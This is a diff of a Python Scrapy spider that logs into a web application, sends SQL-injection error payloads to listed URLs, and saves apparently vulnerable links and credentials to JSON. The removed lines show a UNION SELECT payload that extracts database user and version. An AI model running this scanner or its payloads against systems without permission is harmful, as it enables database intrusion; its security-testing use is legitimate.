@@ -10,16 +10,11 @@ from scrapy.http.request import Request
 from scrapy.http import FormRequest
 from scrapy import log
 from loginform import fill_login_form
+from scrapy.xlib.pydispatch import dispatcher
+from scrapy import signals
 import copy
 import json
 
-login_url = "https://app4.com"
-username = "admin@admin.com"
-password = "admin"
-attack_url = "/admin/status.php"
-#query_string = "username=1%27+OR+1%3D1%23&password=anything"
-query_string = "op=edit&status_id=1"
-payload = "'kasdgh"#"%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
 error_payloads = ["+and+SLAP(10)+--+",
 					"'kasdgh",
 					"+AND+SEELCT"]
@@ -27,6 +22,8 @@ links = open('linksToAttack.txt','r')
 urls = links.readlines()
 links.close()
 items = []
+fin = []
+dic = {}
 
 class step3(Spider):
 	name = "step3"
@@ -47,7 +44,10 @@ class step3(Spider):
 			self.params.append((y[0], y[1]))
 		
 		return FormRequest(url, method=method, formdata=args, callback=self.after_login)
-	
+
+	def __init__(self):
+		dispatcher.connect(self.spider_closed, signals.spider_closed)
+
 	def after_login(self, response):
  		if (((("ERROR: Invalid username") or ("The username/password combination you have entered is invalid"))	in response.body) or (response.url is self.start_urls[0])):
 			self.log("Login failed", level=log.ERROR)
@@ -85,7 +85,6 @@ class step3(Spider):
 		file = open("original_response.html", "w")
 		file.write(response.body)
 		file.close()
-		#attack_with_payload = login_url + attack_url + "?" + query_string + payload
 		for error in error_payloads:
 				attack_with_payload = temp+error
 				newfile.write(attack_with_payload+"\n")
@@ -105,10 +104,6 @@ class step3(Spider):
 								newfile.write(finLink+"\n")
 								yield Request(finLink, meta={'temp':temp}, callback=self.save_attack_resp)
 				print "Did you see this"
-		#attack_with_payload = temp+payload
-		#print "With payload: " + attack_with_payload
-		
-		#yield Request(attack_with_payload, callback=self.save_attack_resp)
 		newfile.close()
 		return 
 
@@ -127,5 +122,17 @@ class step3(Spider):
 					file2 = open("vulnerableinks.txt","a")
 					file2.write(temp+"\n")
 					file2.close()
+					dic1 ={}
+					dic1["method"] = "" #Pending
+					dic1["LoginRequired"] = "" #Pending
+					dic1["username"] = self.login_user[0]
+					dic1["password"] = self.login_pass[0]
+					#OtherParameterToWrite #Pending
+					dic[response.url] = [dic1]
 		return None
-	
+
+	def spider_closed(self, spider):
+		fin.append(dic)
+		f = open("step3outputWithFakeAttacks.json", 'w')
+		f.write(json.dumps(fin,indent= 4, sort_keys = True))
+		f.close()
